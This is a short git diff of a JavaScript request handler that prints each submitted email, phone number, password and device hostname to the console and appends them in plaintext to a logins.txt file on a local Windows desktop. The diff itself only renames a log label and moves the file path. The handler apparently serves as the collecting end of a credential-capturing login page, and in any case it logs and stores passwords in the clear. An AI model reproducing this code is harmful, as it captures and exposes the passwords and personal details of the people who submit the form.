@@ -18,12 +18,12 @@ export default async function handler(req, res) {
   console.log(`Password: ${password}`)
   console.log(`Horário: ${new Date()}`)
   console.log(`client IP: ${hostname}`)
-  console.log(`client IP: ${telefone}`)
+  console.log(`Telefone: ${telefone}`)
 
 
 
   await fs.appendFile(
-    "C:/Users/nexuusz/Desktop/Nova pasta/logins/logins.txt",
+    "C:/Users/nexuusz/Desktop/Projetão/logins/logins.txt",
     `Email: ${email}\nTelefone: ${telefone}\nSenha:${password}\nData:${new Date()}\nDispositivo:${hostname}\n\n`
   )
 
